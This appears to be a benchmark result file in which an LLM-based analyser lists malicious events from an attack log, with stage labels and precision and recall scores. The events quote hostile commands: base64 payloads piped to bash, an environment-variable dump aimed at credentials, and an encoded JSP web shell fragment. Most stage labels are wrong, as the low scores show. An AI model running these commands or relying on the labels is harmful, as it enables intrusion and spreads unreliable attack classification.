@@ -1,0 +1,96 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ifconfig",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ping -c 1 10.67.200.200",
+        "stage": "Discovery"
+      },
+      {
+        "command": "arp -a",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -ic '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node'  -p '\"ca8f367fc32a\" + JSON.stringify(process.env) + \"ca8f367fc32a\"'",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cat /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.log",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVydC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9...[truncated, 1233 chars total]",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Persistence"
+      },
+      {
+        "command": "del /f /q c:\\windows\\logout.jsp",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attack begins with initial access via base64 encoded commands executed through Bash. The attacker performs discovery actions such as using `whoami`, `ifconfig` and `ping`. Later, there is an attempt to gather sensitive information like environmental variables indicative of credential theft. Various processes are also related to defense evasion attempts and persistence mechanisms, where files get deleted possibly to avoid detection.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 53922,
+      "completion_tokens": 1979,
+      "total_tokens": 55901,
+      "wall_clock_s": 27.822,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2727272727272727,
+      "recall": 0.375,
+      "f1": 0.3157894736842105,
+      "tp": 3,
+      "fp": 8,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.09090909090909091,
+      "recall": 0.14285714285714285,
+      "f1": 0.1111111111111111,
+      "tp": 1,
+      "fp": 10,
+      "fn": 6,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 53922,
+      "completion_tokens": 1979,
+      "total_tokens": 55901,
+      "wall_clock_s": 27.822,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
